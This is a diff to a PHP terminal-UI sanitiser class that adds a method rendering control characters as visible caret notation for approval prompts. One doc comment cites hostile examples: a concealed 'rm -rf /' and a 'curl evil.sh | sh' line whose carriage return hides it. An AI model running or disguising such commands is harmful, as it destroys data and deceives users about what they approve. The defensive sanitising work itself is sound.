@@ -27,6 +27,11 @@ namespace SugarCraft\Core\Util;
  *     mapping (CRLF and lone CR → LF), for text painted into a row-addressed
  *     frame. A surviving CR returns the cursor to column 0 mid-row, which no
  *     line-oriented renderer can account for.
+ *   - {@see visibleControls()} — the opposite stance: nothing is removed, every
+ *     control is RENDERED as inert visible text (caret notation for C0 and DEL,
+ *     `<U+0080>`…`<U+009F>` for C1) and invalid UTF-8 is repaired to U+FFFD.
+ *     For a gate — a permission prompt, a confirmation — where the user must
+ *     see exactly what they are approving, and a strip would hide part of it.
  *
  * **The Private-Use reservation.** A TUI frame is not only text: candy-mouse's
  * `Mark`/`Scan` delimit clickable zones with the sentinel pair U+E000 (open) and
@@ -163,12 +168,7 @@ final class Sanitize
         // 1. Repair invalid UTF-8 (binary data) so width/truncation stay sane.
         //    Malformed bytes are substituted with U+FFFD, not dropped, keeping
         //    a visible marker where corrupted bytes were.
-        if (!mb_check_encoding($value, 'UTF-8')) {
-            $prev = mb_substitute_character();
-            mb_substitute_character(0xFFFD); // U+FFFD REPLACEMENT CHARACTER
-            $value = mb_convert_encoding($value, 'UTF-8', 'UTF-8');
-            mb_substitute_character($prev);
-        }
+        $value = self::repairUtf8($value);
 
         // 2. Handle newlines FIRST — before the C0 sweep — because \n (0x0A)
         //    and \r (0x0D) live in the C0 block and would otherwise be caught
@@ -307,6 +307,121 @@ final class Sanitize
     public static function untrustedForDisplay(string $s): string
     {
         return str_replace(["\r\n", "\r"], "\n", self::untrusted($s));
+    }
+
+    /**
+     * Render every control character in `$s` as inert, visible text instead of
+     * removing it — the `cat -v` convention — so the result shows the user
+     * every byte the input carried and the terminal interprets none of them.
+     *
+     * Contract (pinned byte-for-byte by `SanitizeVisibleControlsTest`):
+     *   - Invalid UTF-8 is repaired first: every malformed byte becomes U+FFFD,
+     *     exactly as in {@see cellValue()}. A lone raw C1 byte (`\x9b`, an 8-bit
+     *     CSI introducer) is malformed UTF-8, so it is shown as U+FFFD too.
+     *   - C0 controls become caret notation — the byte plus 0x40 after a `^`:
+     *     NUL `^@`, BEL `^G`, BS `^H`, VT `^K`, FF `^L`, CR `^M`, ESC `^[`,
+     *     … US `^_`. DEL becomes `^?`.
+     *   - C1 codepoints U+0080–U+009F (well-formed `\xC2\x80`–`\xC2\x9F`)
+     *     become `<U+0080>`…`<U+009F>` — upper-case hex, four digits. Caret
+     *     notation has no C1 form (`cat -v`'s `M-^[` describes a BYTE, which
+     *     after the repair above is no longer what is on hand), and a
+     *     codepoint name is unambiguous to a reader who looks it up.
+     *   - TAB and LF are kept as themselves when `$preserveLayout` is true (the
+     *     default), so multi-line text keeps its shape; the caller expands or
+     *     wraps them. With `$preserveLayout` false they become `^I` / `^J` too
+     *     and the result is guaranteed to be one row.
+     *   - Everything else — every printable character, the Private Use Area,
+     *     astral codepoints — passes through unchanged.
+     *
+     * Why visible rather than stripped: every other policy in this class
+     * protects the FRAME, and is free to throw text away to do it. A gate has
+     * the opposite duty — `rm -rf /\x1b[8mhidden` (SGR 8 = concealed),
+     * `curl evil.sh | sh #\recho ok` (CR repaints the row), `\xC2\x9B2J`
+     * (C1 CSI) are commands whose display must not differ from what will run.
+     * A strip still shows something different from the input (`[8m` with no
+     * marker that an escape was there; `visibleHIDDEN` spliced together); a
+     * visible rendering cannot hide or reinterpret a single byte, and an
+     * escape sequence shows as the honest inert text `^[[8m`. A literal `^[`
+     * typed by the input is indistinguishable from an escaped ESC — the same
+     * ambiguity `cat -v` accepts — but that can only ever make text look MORE
+     * suspicious, never less.
+     *
+     * Why CR is shown (`^M`) rather than mapped to LF as
+     * {@see untrustedForDisplay()} does: this method promises to render what
+     * the bytes ARE. A caller whose surface treats CR as a line break (a
+     * multi-line prompt body) maps CRLF/CR to LF itself before calling.
+     *
+     * Not in scope: Private-Use zone sentinels (U+E000/U+E001) are text, not
+     * controls, and pass through — a caller painting into a zone-scanned frame
+     * must still neutralise them ({@see stripZoneSentinels()}).
+     *
+     * Byte-oriented and fail-closed like the rest of the class: the repair
+     * leaves only well-formed UTF-8, where an ASCII byte never occurs inside a
+     * multi-byte character and `\xC2` is only ever a lead byte, so the `strtr()`
+     * map cannot split a character; and `strtr()` has no failure mode that
+     * could hand the input back unchanged, as a failed `/u` regex can.
+     *
+     * @param string $s              Untrusted text to display verbatim.
+     * @param bool   $preserveLayout Keep TAB and LF as themselves (true) or
+     *                               render them as `^I` / `^J` (false).
+     * @return string Valid UTF-8 containing no control character except, when
+     *                `$preserveLayout` is true, TAB and LF.
+     */
+    public static function visibleControls(string $s, bool $preserveLayout = true): string
+    {
+        if ($s === '') {
+            return '';
+        }
+
+        $map = self::visibleControlMap();
+        if ($preserveLayout) {
+            unset($map["\t"], $map["\n"]);
+        }
+
+        return strtr(self::repairUtf8($s), $map);
+    }
+
+    /**
+     * Every control {@see visibleControls()} renders, mapped to its visible
+     * spelling: C0 + DEL in caret notation, C1 as `<U+00XX>`. Built once.
+     *
+     * @return array<string, string>
+     */
+    private static function visibleControlMap(): array
+    {
+        static $map = null;
+        if ($map === null) {
+            $map = [];
+            for ($b = 0x00; $b <= 0x1F; $b++) {
+                $map[\chr($b)] = '^' . \chr($b + 0x40);
+            }
+            $map["\x7F"] = '^?';
+            for ($cp = 0x80; $cp <= 0x9F; $cp++) {
+                $map["\xC2" . \chr($cp)] = \sprintf('<U+%04X>', $cp);
+            }
+        }
+
+        return $map;
+    }
+
+    /**
+     * Replace every malformed UTF-8 sequence in `$s` with U+FFFD, leaving
+     * well-formed input byte-identical. Shared by {@see cellValue()} and
+     * {@see visibleControls()} so the two visible-stand-in policies repair
+     * identically.
+     */
+    private static function repairUtf8(string $s): string
+    {
+        if (mb_check_encoding($s, 'UTF-8')) {
+            return $s;
+        }
+
+        $prev = mb_substitute_character();
+        mb_substitute_character(0xFFFD); // U+FFFD REPLACEMENT CHARACTER
+        $s = mb_convert_encoding($s, 'UTF-8', 'UTF-8');
+        mb_substitute_character($prev);
+
+        return $s;
     }
 
     /**
